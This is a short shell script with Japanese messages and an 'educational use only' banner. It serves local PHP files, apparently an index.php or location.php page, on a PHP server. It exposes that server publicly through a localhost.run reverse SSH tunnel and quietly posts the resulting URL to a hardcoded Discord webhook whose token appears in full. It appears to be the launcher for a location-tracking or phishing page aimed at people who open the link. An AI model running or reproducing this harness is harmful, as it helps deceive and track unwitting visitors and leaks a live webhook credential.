#!/bin/sh

clear

echo "╔══════════════════════════════════════╗"
echo "║ 🌸 開発者: Devcode                  ║"
echo "║ ⚠️  本ツールは教育目的でのみ使用可能    ║"
echo "╚══════════════════════════════════════╝"

echo "📦 パッケージをインストール中です..."
apk update > /dev/null 2>&1
apk add php php-cli php-curl curl openssh grep > /dev/null 2>&1

echo "📁 サーバールートを作成中（/var/www）..."
mkdir -p /var/www
cp ./*.php /var/www/ 2>/dev/null
chmod 644 /var/www/*.php 2>/dev/null

echo "📄 サーバールートのファイル一覧:"
ls -l /var/www/

if [ ! -f /var/www/index.php ] && [ ! -f /var/www/location.php ]; then
  echo "⚠️  /var/www/ に index.php または location.php がありません。"
  echo "    PHPファイルを /var/www/ に配置してください。"
fi

echo "🚀 PHPサーバーを起動中（ポート: 8080, /var/www がルート）..."
cd /var/www
php -S 0.0.0.0:8080 > /dev/null 2>&1 &
php_pid=$!
sleep 2

echo "🌐 トンネル起動中（localhost.run）..."
yes yes | ssh -o StrictHostKeyChecking=accept-new -R 80:localhost:8080 nokey@localhost.run > .log 2>&1 &
ssh_pid=$!
sleep 5

url=$(grep -o 'https://[^ ]*\.lhr\.life' .log | head -n 1)
echo "✨ 発行URL: $url"

webhook_url="https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x"
json="{\"content\": \"🔔 URLが発行されました\n$url\"}"
curl -H "Content-Type: application/json" -X POST -d "$json" "$webhook_url" > /dev/null 2>&1

trap 'echo "🛑 停止中..."; kill $php_pid $ssh_pid; exit 0' INT
wait